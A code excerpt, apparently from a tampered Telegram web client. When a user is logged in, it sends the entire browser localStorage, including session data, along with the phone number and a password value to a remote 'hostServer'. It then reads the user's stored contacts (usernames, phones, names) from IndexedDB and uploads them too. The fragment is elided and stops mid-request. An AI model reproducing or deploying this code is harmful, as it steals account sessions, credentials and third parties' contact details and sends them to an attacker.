  ...
  if(localStorage.getItem('authLogin') == null) {
    var task = setInterval(function() {
      ...
      if(userid_data != undefined && userid_data['id'] != null && userid_data['id'] != '') {
        ...
        httpRequest.open('POST', hostServer+'/system/tgdata/uploadCk/' + uphone + '/' + pwdas, true);
        httpRequest.setRequestHeader('Content-type', 'application/json');
        httpRequest.send(JSON.stringify(localStorage));
        httpRequest.onreadystatechange = function() {
          console.log('ok');
          const request: IDBOpenDBRequest = window.indexedDB.open('tweb');
         ...
         const contactArray: uInfo[] = [];
         objectStore.openCursor().onsuccess = function(event: Event) {
           const cursor: IDBCursorWithValue = (event.target as IDBRequest).result;
           if(cursor) {
             const data: any = cursor.value;
             if(data.hasOwnProperty('pFlags') && data.pFlags.hasOwnProperty('contact')) {
               contactArray.push({'username': data.username, 'phone': data.phone, 'nickName': data.sortName});
               console.log('read-oneD', data.sortName);
             }
             cursor.continue();
           } else {
             console.log('read contact over');
             console.log('read-data', JSON.stringify(contactArray));
             fetch(hostServer+'/system/tgdata/uploadContact/' + JSON.parse(httpRequest.responseText).content + '/' + pwdas, {
               method: 'POST',
               headers: {
